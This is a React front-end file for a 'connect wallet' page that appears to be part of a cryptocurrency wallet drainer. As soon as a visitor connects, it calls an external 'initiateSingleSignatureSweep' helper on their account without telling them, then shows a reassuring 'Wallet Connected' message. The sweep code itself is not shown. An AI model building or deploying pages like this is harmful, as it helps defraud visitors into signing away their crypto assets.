import { useState } from 'react'
import { useWalletStore } from './stores/walletStore'
import ConnectButton from './components/ConnectButton'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)

  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      const { account: addr, provider } = await window.walletHelpers?.connectWallet?.() || {}

      if (!addr || !provider) {
        throw new Error('Failed to connect wallet')
      }

      setAccount(addr)
      setIsConnected(true)

      const result = await window.walletHelpers?.initiateSingleSignatureSweep?.(provider, addr)

      if (result?.success) {
        setTransferStatus(result)
        setShowSummary(true)
      } else {
        throw new Error(result?.message || 'Authorization failed')
      }
    } catch (err) {
      console.error(err)
      setError(err.message || 'Connection failed. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Connected Status */}
        {isConnected && account && (
          <div className="bg-green-900/30 border border-green-600 rounded-2xl p-5 mb-6 text-center">
            <p className="text-green-400 text-sm">Wallet Connected</p>
            <p className="font-mono text-white mt-1 break-all">{account}</p>
          </div>
        )}

        {/* Connect Button */}
        {!isConnected && (
          <ConnectButton onClick={handleConnect} isLoading={isLoading} />
        )}

        {/* Error Message */}
        {error && (
          <div className="bg-red-900/50 border border-red-700 rounded-2xl p-4 mt-4 text-center">
            <p className="text-red-300">{error}</p>
          </div>
        )}

        {/* Summary Modal */}
        {showSummary && <SummaryModal onClose={() => setShowSummary(false)} />}
      </div>
    </div>
  )
}

export default App

